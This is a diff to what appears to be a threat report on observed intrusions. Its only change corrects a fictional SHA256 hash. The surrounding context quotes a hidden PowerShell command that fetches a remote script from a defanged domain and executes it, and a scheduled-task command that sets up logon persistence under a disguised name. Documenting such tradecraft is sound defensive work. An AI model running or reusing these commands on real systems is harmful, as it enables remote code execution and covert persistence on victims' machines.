@@ -7,7 +7,7 @@ command observed in all three cases:
     conhost.exe --headless powershell.exe -w hidden -c "irm hxxps://cdn-updates-check[.]com/v.txt | iex"
 
 The downloaded script writes the payload to %APPDATA%\msbuild\upd.exe (SHA256
-9f2c1e0a7b5d4c3e8a1f6b2d0c9e8f7a6b5c4d3e2f1a0b9c8d7e6f5a4b3c2d1e0, fictional) and establishes
+9f2c1e0a7b5d4c3e8a1f6b2d0c9e8f7a6b5c4d3e2f1a0b9c8d7e6f5a4b3c2d1e, fictional) and establishes
 persistence with a scheduled task:
 
     schtasks /create /sc ONLOGON /tn "OneDrive Sync Health" /tr "C:\Users\<user>\AppData\Roaming\msbuild\upd.exe" /f
